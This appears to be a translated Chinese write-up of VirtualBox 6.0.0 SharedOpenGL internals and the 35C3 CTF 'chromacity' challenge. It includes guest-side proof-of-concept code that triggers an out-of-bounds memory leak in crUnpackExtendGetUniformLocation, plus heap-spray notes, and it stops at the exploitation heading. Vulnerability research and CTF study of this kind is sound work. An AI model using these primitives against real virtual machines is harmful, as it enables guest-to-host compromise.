# VirtualBox虚拟机逃逸之SharedOpenGL模块

阅读量 **228313**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-05-06 14:30:27

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0169ca5f34f2306385.png)

## 0x00 前言

最近研究VirtualBox虚拟机逃逸，前面分析了VirtualBox的HGCM通信协议，本文我们基于HGCM协议与SharedOpenGL模块进行通信，并分析`SharedOpenGL`中使用的`chromium协议`，复现SharedOpenGL中出现的历史漏洞从而进行虚拟机逃逸。

## 0x01 前置知识

###  chromium协议

####  引言

我们使用HGCM通信协议，可以在Guest中与主机的一些服务进行通信，其中有一个服务名为`SharedOpenGL`，这是一个用于3D加速的服务，首先主机中的VirtualBox需要开启3D加速才能在Guest中进行调用

![](https://p5.ssl.qhimg.com/t0141aa8eb812ffb631.png)

在`src\VBox\GuestHost\OpenGL`目录下，是位于Guest中的组件源码，该组件在Guest中通过HGCM协议与Host中的`SharedOpenGL`进行连接，然后使用了他们之间的一套新的协议（称之为“`chromium协议`”）来进行数据交换，对于`src\VBox\GuestHost\OpenGL`，我们不用去分析其实现，因为它就是一个相当于客户端一样的东西，我们重点分析Host中的`SharedOpenGL`。

首先看到`src\VBox\HostServices\SharedOpenGL\crserver\crservice.cpp`源文件中的`svcCall`函数，前面介绍过，这是HGCM对`SharedOpenGL`模块的函数调用入口。

####  svcCall

    
    
    static DECLCALLBACK(void) svcCall (void *, VBOXHGCMCALLHANDLE callHandle, uint32_t u32ClientID, void *pvClient,
                                       uint32_t u32Function, uint32_t cParms, VBOXHGCMSVCPARM paParms[], uint64_t tsArrival)
    {
    ..................................................
        switch (u32Function)
        {
            case SHCRGL_GUEST_FN_WRITE:
            {
    ..................................
                    /* Fetch parameters. */
                    uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;
                    uint32_t cbBuffer = paParms[0].u.pointer.size;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);
    ...................................
                break;
            }
    
            case SHCRGL_GUEST_FN_INJECT:
            {
    .......................................
                    /* Fetch parameters. */
                    uint32_t u32InjectClientID = paParms[0].u.uint32;
                    uint8_t *pBuffer  = (uint8_t *)paParms[1].u.pointer.addr;
                    uint32_t cbBuffer = paParms[1].u.pointer.size;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientWrite(u32InjectClientID, pBuffer, cbBuffer);
    .................................
                break;
            }
    
            case SHCRGL_GUEST_FN_READ:
            {
    ...........................................
                /* Fetch parameters. */
                uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;
                uint32_t cbBuffer = paParms[0].u.pointer.size;
    
                /* Execute the function. */
                rc = crVBoxServerClientRead(u32ClientID, pBuffer, &cbBuffer);
    .....................................................
                break;
            }
    
            case SHCRGL_GUEST_FN_WRITE_READ:
            {
    ..................................................
                    /* Fetch parameters. */
                    uint8_t *pBuffer     = (uint8_t *)paParms[0].u.pointer.addr;
                    uint32_t cbBuffer    = paParms[0].u.pointer.size;
    
                    uint8_t *pWriteback  = (uint8_t *)paParms[1].u.pointer.addr;
                    uint32_t cbWriteback = paParms[1].u.pointer.size;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);
                    if (!RT_SUCCESS(rc))
                    {
                        Assert(VERR_NOT_SUPPORTED==rc);
                        svcClientVersionUnsupported(0, 0);
                    }
    
                    rc = crVBoxServerClientRead(u32ClientID, pWriteback, &cbWriteback);
    ...........................................
                break;
            }
    
            case SHCRGL_GUEST_FN_SET_VERSION:
            {
    .........................................
                    /* Fetch parameters. */
                    uint32_t vMajor    = paParms[0].u.uint32;
                    uint32_t vMinor    = paParms[1].u.uint32;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientSetVersion(u32ClientID, vMajor, vMinor);
    ................................
                break;
            }
    
            case SHCRGL_GUEST_FN_SET_PID:
            {
      ................................
                    /* Fetch parameters. */
                    uint64_t pid    = paParms[0].u.uint64;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientSetPID(u32ClientID, pid);
    .........................
                break;
            }
    
            case SHCRGL_GUEST_FN_WRITE_BUFFER:
            {
    ..................................
                    /* Fetch parameters. */
                    uint32_t iBuffer      = paParms[0].u.uint32;
                    uint32_t cbBufferSize = paParms[1].u.uint32;
                    uint32_t ui32Offset   = paParms[2].u.uint32;
                    uint8_t *pBuffer      = (uint8_t *)paParms[3].u.pointer.addr;
                    uint32_t cbBuffer     = paParms[3].u.pointer.size;
    
                    /* Execute the function. */
                    CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);
                    if (!pSvcBuffer || ((uint64_t)ui32Offset+cbBuffer)>cbBufferSize)
                    {
                        rc = VERR_INVALID_PARAMETER;
                    }
                    else
                    {
                        memcpy((void*)((uintptr_t)pSvcBuffer->pData+ui32Offset), pBuffer, cbBuffer);
    
                        /* Return the buffer id */
                        paParms[0].u.uint32 = pSvcBuffer->uiId;
    ......................
                break;
            }
    
            case SHCRGL_GUEST_FN_WRITE_READ_BUFFERED:
            {
     .................................
                    /* Fetch parameters. */
                    uint32_t iBuffer = paParms[0].u.uint32;
                    uint8_t *pWriteback  = (uint8_t *)paParms[1].u.pointer.addr;
                    uint32_t cbWriteback = paParms[1].u.pointer.size;
    
                    CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, 0);
                    if (!pSvcBuffer)
                    {
                        LogRel(("OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\n", iBuffer));
                        rc = VERR_INVALID_PARAMETER;
                        break;
                    }
    
                    uint8_t *pBuffer     = (uint8_t *)pSvcBuffer->pData;
                    uint32_t cbBuffer    = pSvcBuffer->uiSize;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);
                    if (!RT_SUCCESS(rc))
                    {
                        Assert(VERR_NOT_SUPPORTED==rc);
                        svcClientVersionUnsupported(0, 0);
                    }
    
                    rc = crVBoxServerClientRead(u32ClientID, pWriteback, &cbWriteback);
    
                    if (RT_SUCCESS(rc))
                    {
                        /* Update parameters.*/
                        paParms[1].u.pointer.size = cbWriteback;
                    }
                    /* Return the required buffer size always */
                    paParms[2].u.uint32 = cbWriteback;
    
                    svcFreeBuffer(pSvcBuffer);
                }
    
                break;
            }
    

从上面的源码我们可以知道

> That sequence can be performed by the Chromium client in  
>  different ways:
>
>   1. Single-step: send the rendering commands and receive the  
>  resulting frame buffer with one single message.
>   2. Two-step: send a message with the rendering commands  
>  and let the server interpret them, then send another  
>  message requesting the resulting frame buffer.
>   3. Buffered: send the rendering commands and let the server  
>  store them in a buffer without interpreting it, then send a  
>  second message to make the server interpret the buffered  
>  commands and return the resulting frame buffer.
>

Guest中的客户端会通过HGCM发送一连串的命令到`SharedOpenGL`服务中被解析并返回图形渲染的结果给Guest。其中我们注意到`SHCRGL_GUEST_FN_WRITE_BUFFER`分支

####  SHCRGL_GUEST_FN_WRITE_BUFFER

    
    
                    /* Execute the function. */
                    CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, cbBufferSize);
    

进入`svcGetBuffer`函数

    
    
    static CRVBOXSVCBUFFER_t* svcGetBuffer(uint32_t iBuffer, uint32_t cbBufferSize)
    {
        CRVBOXSVCBUFFER_t* pBuffer;
    
        if (iBuffer)
        {
    ...........................
        }
        else /*allocate new buffer*/
        {
            pBuffer = (CRVBOXSVCBUFFER_t*) RTMemAlloc(sizeof(CRVBOXSVCBUFFER_t));
            if (pBuffer)
            {
                pBuffer->pData = RTMemAlloc(cbBufferSize);
    .........................
    

其中我们注意到当参数`iBuffer`为0时，会申请两个堆`RTMemAlloc(sizeof(CRVBOXSVCBUFFER_t))`和`RTMemAlloc(cbBufferSize)`，由于参数是可以自由控制的，因此通过该功能，我们可以自由的申请堆块，在`Heap
Spray`中，这个非常有用。通过分析，`SHCRGL_GUEST_FN_WRITE_BUFFER`命令的功能就是`从Guset中接收一串数据，并存入Buffer中，如果Buffer不存在则创建一个新的`  
我们将这个过程封装为函数用于使用

    
    
    int alloc_buf(int client,int size,const char *msg,int msg_len) {
       int rc = hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,"%u%u%u%b",0,size,0,"in",msg,msg_len);
       if (rc) {
          die("[-] alloc_buf error");
       }
       return ans_buf[0];
    }
    

####  SHCRGL_GUEST_FN_WRITE_READ_BUFFERED

接下来我们看到`SHCRGL_GUEST_FN_WRITE_READ_BUFFERED`命令,首先是该命令需要3个参数

    
    
                /* Verify parameter count and types. */
                if (cParms != SHCRGL_CPARMS_WRITE_READ_BUFFERED)
                {
                    rc = VERR_INVALID_PARAMETER;
                }
                else
                if (    paParms[0].type != VBOX_HGCM_SVC_PARM_32BIT   /* iBufferID */
                     || paParms[1].type != VBOX_HGCM_SVC_PARM_PTR     /* pWriteback */
                     || paParms[2].type != VBOX_HGCM_SVC_PARM_32BIT   /* cbWriteback */
                     || !paParms[0].u.uint32 /*iBufferID can't be 0 here*/
                   )
                {
                    rc = VERR_INVALID_PARAMETER;
                }
    

第一个为`iBufferID`，也就是通过`SHCRGL_GUEST_FN_WRITE_BUFFER`命令创建的buffer对应的ID；第二个参数为`pWriteback`，是一个指针，用于在Guest中接收处理后的数据；第三个参数为`cbWriteback`表示数据长度。  
我们将调用封装为函数用于使用

    
    
    char crmsg_buf[0x1000];
    
    int crmsg(int client,const char *msg,int msg_len) {
       int buf_id = alloc_buf(client,0x1000,msg,msg_len);
       int rc = hgcm_call(client,SHCRGL_GUEST_FN_WRITE_READ_BUFFERED,"%u%b%u",buf_id,"out",crmsg_buf,0x1000,0x1000);
       if (rc) {
          die("[-] crmsg error");
       }
    }
    

为了便于分析，我们写了一个测试程序

    
    
    int main() {
       int idClient = hgcm_connect("VBoxSharedCrOpenGL");
       printf("idClient=%d\n",idClient);
       set_version(idClient);
       crmsg(idClient,"hello",0x6);
    }
    

这里我们简单的发送`hello`到host中，看看会发生什么。  
继续向下看

    
    
                    CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, 0);
                    if (!pSvcBuffer)
                    {
                        LogRel(("OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\n", iBuffer));
                        rc = VERR_INVALID_PARAMETER;
                        break;
                    }
    
                    uint8_t *pBuffer     = (uint8_t *)pSvcBuffer->pData;
                    uint32_t cbBuffer    = pSvcBuffer->uiSize;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);
    

通过`iBuffer`索引获取到了`pBuffer`以后，传入`crVBoxServerClientWrite`函数进行处理，我们进入该函数。

    
    
    int32_t crVBoxServerClientWrite(uint32_t u32ClientID, uint8_t *pBuffer, uint32_t cbBuffer)
    {
        CRClient *pClient=NULL;
        int32_t rc = crVBoxServerClientGet(u32ClientID, &pClient);
    

该函数首先调用`crVBoxServerClientGet`获取服务句柄

    
    
    int32_t crVBoxServerClientGet(uint32_t u32ClientID, CRClient **ppClient)
    {
        CRClient *pClient = NULL;
    
        pClient = crVBoxServerClientById(u32ClientID);
    
        if (!pClient)
        {
            WARN(("client not found!"));
            *ppClient = NULL;
            return VERR_INVALID_PARAMETER;
        }
    
        if (!pClient->conn->vMajor)
        {
            WARN(("no major version specified for client!"));
            *ppClient = NULL;
            return VERR_NOT_SUPPORTED;
        }
    

在`crVBoxServerClientGet`函数中，会判断`pClient->conn->vMajor`，如果没有设置则报错。该字段是在`svcCall`中的`SHCRGL_GUEST_FN_SET_VERSION`命令中被设置的

    
    
            case SHCRGL_GUEST_FN_SET_VERSION:
            {
    ...........
                    /* Fetch parameters. */
                    uint32_t vMajor    = paParms[0].u.uint32;
                    uint32_t vMinor    = paParms[1].u.uint32;
    
                    /* Execute the function. */
                    rc = crVBoxServerClientSetVersion(u32ClientID, vMajor, vMinor);
    

因此，在我们使用`SHCRGL_GUEST_FN_WRITE_BUFFER`之前，应该先使用`SHCRGL_GUEST_FN_SET_VERSION`设置一下版本

    
    
    int set_version(int client) {
       int rc = hgcm_call(client,SHCRGL_GUEST_FN_SET_VERSION,"%u%u",CR_PROTOCOL_VERSION_MAJOR,CR_PROTOCOL_VERSION_MINOR);
       if (rc) {
          die("[-] set_version error");
       }
       return 0;
    }
    

当`int32_t rc = crVBoxServerClientGet(u32ClientID,
&pClient);`执行完获取到服务句柄以后，就继续调用`crVBoxServerInternalClientWriteRead`函数

    
    
        pClient->conn->pBuffer = pBuffer;
        pClient->conn->cbBuffer = cbBuffer;
    #ifdef VBOX_WITH_CRHGSMI
        CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&pClient->conn->CmdData);
    #endif
    
        crVBoxServerInternalClientWriteRead(pClient);
    
        return VINF_SUCCESS;
    }
    

crVBoxServerInternalClientWriteRead函数如下

    
    
    static void crVBoxServerInternalClientWriteRead(CRClient *pClient)
    {
    ............................
        crNetRecv();
        CRASSERT(pClient->conn->pBuffer==NULL && pClient->conn->cbBuffer==0);
        CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&pClient->conn->CmdData);
    
        crServerServiceClients();
        crStateResetCurrentPointers(&cr_server.current);
    ..............
    

先是调用了`crNetRecv`函数，经过调试，调用链如下

    
    
    pwndbg> k
    #0  0x00007f1b3db9ff05 in _crVBoxHGCMReceiveMessage (conn=0x7f1b1cf408c0) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1091
    #1  0x00007f1b3dba13cc in _crVBoxHGCMPerformReceiveMessage (conn=0x7f1b1cf408c0) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:2425
    #2  0x00007f1b3dba141c in crVBoxHGCMRecv () at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:2482
    #3  0x00007f1b3db80238 in crNetRecv () at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/net.c:1307
    #4  0x00007f1b3ddea7b4 in crVBoxServerInternalClientWriteRead (pClient=0x7f1b1d04da10) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:754
    #5  0x00007f1b3ddeacb1 in crVBoxServerClientWrite (u32ClientID=35, pBuffer=0x7f1b1d04e3f0 "hello", cbBuffer=4096) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:792
    #6  0x00007f1b3ddce7c7 in svcCall (callHandle=0x7f1b34c93f50, u32ClientID=35, pvClient=0x7f1b3000a7e0, u32Function=14, cParms=3, paParms=0x7f1b5452d560, tsArrival=29122886987445) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:740
    #7  0x00007f1b6e30325a in hgcmServiceThread (pThread=0x7f1b30003c70, pvUser=0x7f1b30003b10) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:708
    #8  0x00007f1b6e300090 in hgcmWorkerThreadFunc (hThreadSelf=0x7f1b30004050, pvUser=0x7f1b30003c70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
    #9  0x00007f1b8ae47aff in rtThreadMain (pThread=0x7f1b30004050, NativeThread=139754983003904, pszThreadName=0x7f1b30004930 "ShCrOpenGL") at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
    #10 0x00007f1b8af8e098 in rtThreadNativeMain (pvArgs=0x7f1b30004050) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327
    #11 0x00007f1b859da6ba in start_thread (arg=0x7f1b3e1e1700) at pthread_create.c:333
    #12 0x00007f1b87fd84dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
    

可以知道该函数位于`src/VBox/GuestHost/OpenGL/util/net.c`源文件，虽然这里位于`Guset`中的客户端源码，但其实是同样编译了一份给Host用

    
    
    pwndbg> p crNetRecv
    $2 = {int (void)} 0x7f1b3db80208 <crNetRecv>
    pwndbg> vmmap 0x7f1b3db80208
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x7f1b3db6d000     0x7f1b3dbb3000 r-xp    46000 0      /home/sea/Desktop/VirtualBox-6.0.0/out/linux.amd64/debug/bin/VBoxOGLhostcrutil.so +0x13208
    pwndbg>
    

可以知道其在`VBoxOGLhostcrutil.so`库中，从调用链可以知道最终调用到`_crVBoxHGCMReceiveMessage`这里会出现问题

    
    
    static void _crVBoxHGCMReceiveMessage(CRConnection *conn)
    {
        uint32_t len;
        CRVBOXHGCMBUFFER *hgcm_buffer;
        CRMessage *msg;
        CRMessageType cached_type;
    
        len = conn->cbBuffer;
        CRASSERT(len > 0);
        CRASSERT(conn->pBuffer);
    
    #ifndef IN_GUEST
        /* Expect only CR_MESSAGE_OPCODES from the guest. */
        AssertPtrReturnVoid(conn->pBuffer);
    
        if (   conn->cbBuffer >= sizeof(CRMessageHeader)
            && ((CRMessageHeader*) (conn->pBuffer))->type == CR_MESSAGE_OPCODES)
        {
            /* Looks good. */
        }
        else
        {
            AssertFailed();
            /** @todo Find out if this is the expected cleanup. */
            conn->cbBuffer = 0;
            conn->pBuffer  = NULL;
            return;
        }
    #endif
    

这里会将我们传入的数据转换为`CRMessageHeader`结构体，然后判断`type`是否为`CR_MESSAGE_OPCODES`，如果不是，则报错

    
    
    typedef struct {
        CRMessageType          type;
        unsigned int           conn_id;
    } CRMessageHeader;
    

由此可见，我们的数据必须符合要求，当检查通过以后

    
    
    #ifndef IN_GUEST
        if (conn->allow_redir_ptr)
        {
    #endif
            CRASSERT(conn->buffer_size >= sizeof(CRMessageRedirPtr));
    
            hgcm_buffer = (CRVBOXHGCMBUFFER *) _crVBoxHGCMAlloc( conn ) - 1;
            hgcm_buffer->len = sizeof(CRMessageRedirPtr);
    
            msg = (CRMessage *) (hgcm_buffer + 1);
    
            msg->header.type = CR_MESSAGE_REDIR_PTR;
            msg->redirptr.pMessage = (CRMessageHeader*) (conn->pBuffer);
            msg->header.conn_id = msg->redirptr.pMessage->conn_id;
    
    #if defined(VBOX_WITH_CRHGSMI) && !defined(IN_GUEST)
            msg->redirptr.CmdData = conn->CmdData;
            CRVBOXHGSMI_CMDDATA_ASSERT_CONSISTENT(&msg->redirptr.CmdData);
            CRVBOXHGSMI_CMDDATA_CLEANUP(&conn->CmdData);
    #endif
    
            cached_type = msg->redirptr.pMessage->type;
    
            conn->cbBuffer = 0;
            conn->pBuffer  = NULL;
    #ifndef IN_GUEST
    

如果`conn->allow_redir_ptr`被设置，会创建一个新的Msg，并设置type为`CR_MESSAGE_REDIR_PTR`，最后使用`crNetDispatchMessage(
g_crvboxhgcm.recv_list, conn, msg, len
);`将消息挂到消息队列上，由此可见这是一种异步多线程的处理方式。最初调用`crNetRecv`就是为了将请求放到队列中慢慢处理。  
回到`crVBoxServerInternalClientWriteRead`函数

    
    
        crNetRecv();
        CRASSERT(pClient->conn->pBuffer==NULL && pClient->conn->cbBuffer==0);
        CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&pClient->conn->CmdData);
    
        crServerServiceClients();
        crStateResetCurrentPointers(&cr_server.current);
    

接下来该调用`crServerServiceClients`函数

    
    
    void
    crServerServiceClients(void)
    {
        RunQueue *q;
    
        q = getNextClient(GL_FALSE); /* don't block */
        while (q) 
        {
            ClientStatus stat = crServerServiceClient(q);
            if (stat == CLIENT_NEXT && cr_server.run_queue->next) {
                /* advance to next client */
                cr_server.run_queue = cr_server.run_queue->next;
            }
            q = getNextClient(GL_FALSE);
        }
    }
    

以上可以看出，他是依次取出请求对象，然后使用函数`crServerServiceClient`进行处理

    
    
    /**
     * Process incoming/pending message for the given client (queue entry).
     * \return CLIENT_GONE if this client has gone away/exited,
     *         CLIENT_NEXT if we can advance to the next client
     *         CLIENT_MORE if we have to process more messages for this client. 
     */
    static ClientStatus
    crServerServiceClient(const RunQueue *qEntry)
    {
        CRMessage *msg;
        CRConnection *conn;
    
        /* set current client pointer */
        cr_server.curClient = qEntry->client;
    
        conn = cr_server.run_queue->client->conn;
    
        /* service current client as long as we can */
        while (conn && conn->type != CR_NO_CONNECTION &&
                     crNetNumMessages(conn) > 0) {
            unsigned int len;
    
            /*
            crDebug("%d messages on %p",
                            crNetNumMessages(conn), (void *) conn);
            */
    
            /* Don't use GetMessage, because we want to do our own crNetRecv() calls
             * here ourself.
             * Note that crNetPeekMessage() DOES remove the message from the queue
             * if there is one.
             */
            len = crNetPeekMessage( conn, &msg );
    ..........................
            /* Commands get dispatched here */
            crServerDispatchMessage( conn, msg, len );
    

该函数调用`crServerDispatchMessage`函数进行opcode的处理

    
    
    /**
     * This function takes the given message (which should be a buffer of
     * rendering commands) and executes it.
     */
    static void
    crServerDispatchMessage(CRConnection *conn, CRMessage *msg, int cbMsg)
    {
        const CRMessageOpcodes *msg_opcodes;
        int opcodeBytes;
        const char *data_ptr, *data_ptr_end;
    ...............
        if (msg->header.type == CR_MESSAGE_REDIR_PTR)
        {
    #ifdef VBOX_WITH_CRHGSMI
            pCmdData = &msg->redirptr.CmdData;
    #endif
            msg = (CRMessage *) msg->redirptr.pMessage;
        }
    
        CRASSERT(msg->header.type == CR_MESSAGE_OPCODES);
    
        msg_opcodes = (const CRMessageOpcodes *) msg;
        opcodeBytes = (msg_opcodes->numOpcodes + 3) & ~0x03;
    
    #ifdef VBOXCR_LOGFPS
        CRASSERT(cr_server.curClient && cr_server.curClient->conn && cr_server.curClient->conn->id == msg->header.conn_id);
        cr_server.curClient->conn->opcodes_count += msg_opcodes->numOpcodes;
    #endif
    
        data_ptr = (const char *) msg_opcodes + sizeof(CRMessageOpcodes) + opcodeBytes;
        data_ptr_end = (const char *)msg_opcodes + cbMsg; // Pointer to the first byte after message data
    
        enmType = crUnpackGetBufferType(data_ptr - 1,             /* first command's opcode */
                    msg_opcodes->numOpcodes  /* how many opcodes */);
        switch (enmType)
        {
            case CR_UNPACK_BUFFER_TYPE_GENERIC:
    .................
        }
        if (fUnpack)
        {
            crUnpack(data_ptr,                 /* first command's operands */
                     data_ptr_end,             /* first byte after command's operands*/
                     data_ptr - 1,             /* first command's opcode */
                     msg_opcodes->numOpcodes,  /* how many opcodes */
                     &(cr_server.dispatch));   /* the CR dispatch table */
        }
    ..................
    }
    

而`crServerDispatchMessage`函数首先检查是否为`msg->header.type ==
CR_MESSAGE_REDIR_PTR`类型的消息，由于前面将原始消息挂在队列时，由于`conn->allow_redir_ptr`为true，所以消息确实是被转化为`CR_MESSAGE_REDIR_PTR`类型的。检查通过后，后面就调用了`crUnpack`函数来处理`Opcode`，其中`crUnpack`函数是通过脚本`src/VBox/HostServices/SharedOpenGL/unpacker/unpack.py`生成的，可以在编译后的目录`out/linux.amd64/debug/obj/VBoxOGLgen/unpack.c`里找到

    
    
    void crUnpack( const void *data, const void *data_end, const void *opcodes, 
            unsigned int num_opcodes, SPUDispatchTable *table )
    {
        unsigned int i;
        const unsigned char *unpack_opcodes;
        if (table != cr_lastDispatch)
        {
            crSPUCopyDispatchTable( &cr_unpackDispatch, table );
            cr_lastDispatch = table;
        }
    
        unpack_opcodes = (const unsigned char *)opcodes;
        cr_unpackData = (const unsigned char *)data;
        cr_unpackDataEnd = (const unsigned char *)data_end;
    
    #if defined(CR_UNPACK_DEBUG_OPCODES) || defined(CR_UNPACK_DEBUG_LAST_OPCODES)
        crDebug("crUnpack: %d opcodes", num_opcodes);
    #endif
    
        for (i = 0; i < num_opcodes; i++)
        {
    
            CRDBGPTR_CHECKZ(writeback_ptr);
            CRDBGPTR_CHECKZ(return_ptr);
    
            /*crDebug("Unpacking opcode \%d", *unpack_opcodes);*/
    #ifdef CR_UNPACK_DEBUG_PREV_OPCODES
            g_VBoxDbgCrPrevOpcode = *unpack_opcodes;
    #endif
            switch( *unpack_opcodes )
            {
                case CR_ALPHAFUNC_OPCODE:
                    ................
                case CR_ARRAYELEMENT_OPCODE:
                    ..............
    

可以看到这是Opcode处理机，根据不同的Opcode，对应不同的操作。在`cr_opcodes.h`头文件中有这些Opcode的定义。  
综上分析，`SHCRGL_GUEST_FN_WRITE_READ_BUFFERED`命令可以将buffer中的opcode进行处理，最后调用`crVBoxServerClientRead`将结果写回Guest，然后调用`svcFreeBuffer`对Buffer进行释放。

    
    
                    rc = crVBoxServerClientRead(u32ClientID, pWriteback, &cbWriteback);
    
                    if (RT_SUCCESS(rc))
                    {
                        /* Update parameters.*/
                        paParms[1].u.pointer.size = cbWriteback;
                    }
                    /* Return the required buffer size always */
                    paParms[2].u.uint32 = cbWriteback;
    
                    svcFreeBuffer(pSvcBuffer);
    

我们可以写出如下的代码

    
    
    int main() {
       int idClient = hgcm_connect("VBoxSharedCrOpenGL");
       printf("idClient=%d\n",idClient);
       set_version(idClient);
       getchar();
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    0x12345678,
                    0x61616161
                    };
       crmsg(idClient,msg,sizeof(msg));
    }
    

## 0x02 35C3CTF Virtualbox NDay

    
    
    chromacity 477
    Solves: 2
    Please escape VirtualBox. 3D acceleration is enabled for your convenience.
    ​
    No need to analyze the 6.0 patches, they should not contain security fixes.
    ​
    Once you're done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.
    ​
    Challenge files. Password for the encrypted VM image is the flag for "sanity check".
    ​
    Setup
    ​
    UPDATE: You might need to enable nested virtualization.
    ​
    Hint: https://github.com/niklasb/3dpwn/ might be useful
    ​
    Hint 2: this photo was taken earlier today at C3
    ​
    Difficulty estimate: hard
    

题目的VirtualBox为6.0.0版本，通过参考资料已经知道了第一个漏洞点出在`crUnpackExtendGetUniformLocation`函数

###  crUnpackExtendGetUniformLocation

####  分析

    
    
    void crUnpackExtendGetUniformLocation(void)
    {
        int packet_length = READ_DATA(0, int);
        GLuint program = READ_DATA(8, GLuint);
        const char *name = DATA_POINTER(12, const char);
        SET_RETURN_PTR(packet_length-16);
        SET_WRITEBACK_PTR(packet_length-8);
        cr_unpackDispatch.GetUniformLocation(program, name);
    }
    

该函数没有检查`packet_length`，而该字段是我们从Guest中通过HGCM和Chromium协议传入的数据中的，因此完全可控。  
为了触发调用该函数，我们使用如下代码

    
    
    int main() {
       int idClient = hgcm_connect("VBoxSharedCrOpenGL");
       printf("idClient=%d\n",idClient);
       set_version(idClient);
       getchar();
       int offset = 0x200;
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    offset, //packet_length
                    CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode
                    0, //program
                    *(uint32_t *)"leak" //name
                    };
       crmsg(idClient,msg,sizeof(msg));
       for (int i=0;i<100;i++) {
          printf("%02x ",crmsg_buf[i]);
       }
    }
    

通过调试可以知道

    
    
    In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c
       346 void crUnpackExtendGetUniformLocation(void)
       347 {
       348     int packet_length = READ_DATA(0, int);
       349     GLuint program = READ_DATA(8, GLuint);
       350     const char *name = DATA_POINTER(12, const char);
     ► 351     SET_RETURN_PTR(packet_length-16);
       352     SET_WRITEBACK_PTR(packet_length-8);
       353     cr_unpackDispatch.GetUniformLocation(program, name);
       354 }
       355 
    pwndbg> x /20bx cr_unpackData+0x200-16
    0x7f1adc9a03d0:    0x08    0x19    0x00    0x00    0x01    0x14    0x00    0x00
    0x7f1adc9a03d8:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
    0x7f1adc9a03e0:    0xfa    0x6c    0x28    0xf2
    

SET_RETURN_PTR操作将`cr_unpackData+packet_length-16`处的数据拷贝到了Guest中的`crmsg_buf`中，于是我们可以利用起来进行越界内存地址泄露

![](https://p3.ssl.qhimg.com/t016d090de09bc4677b.png)

为了泄露地址，我们首先使用`heap spray`布置堆风水。  
首先，我们得了解一下当我们与`SharedOpenGL`服务建立连接时，会创建哪些结构体，当与服务连接时，`svcConnect`会被HGCM协议调用进行连接初始化

    
    
    static DECLCALLBACK(int) svcConnect (void *, uint32_t u32ClientID, void *pvClient, uint32_t fRequestor, bool fRestoring)
    {
        RT_NOREF(pvClient, fRequestor, fRestoring);
    
        if (g_u32fCrHgcmDisabled)
        {
            WARN(("connect not expected"));
            return VERR_INVALID_STATE;
        }
    
        Log(("SHARED_CROPENGL svcConnect: u32ClientID = %d\n", u32ClientID));
    
        int rc = crVBoxServerAddClient(u32ClientID);
    
        return rc;
    }
    

crVBoxServerAddClient函数如下

    
    
    int32_t crVBoxServerAddClient(uint32_t u32ClientID)
    {
        CRClient *newClient;
    .....
    
        newClient = (CRClient *) crCalloc(sizeof(CRClient));
     .....
        newClient->conn = crNetAcceptClient(cr_server.protocol, NULL,
                                            cr_server.tcpip_port,
                                            cr_server.mtu, 0);
    .................
    }
    

crNetAcceptClient函数如下

    
    
    CRConnection *
    crNetAcceptClient( const char *protocol, const char *hostname,
                                         unsigned short port, unsigned int mtu, int broker )
    {
        CRConnection *conn;
    ...................
        conn = (CRConnection *) crCalloc( sizeof( *conn ) );
    }
    

可以看到这里申请了结构体`CRClient`和结构体`CRConnection`的内存。其中`CRClient`大小为`0x9d0`，`CRConnection`大小为`0x298`

####  利用

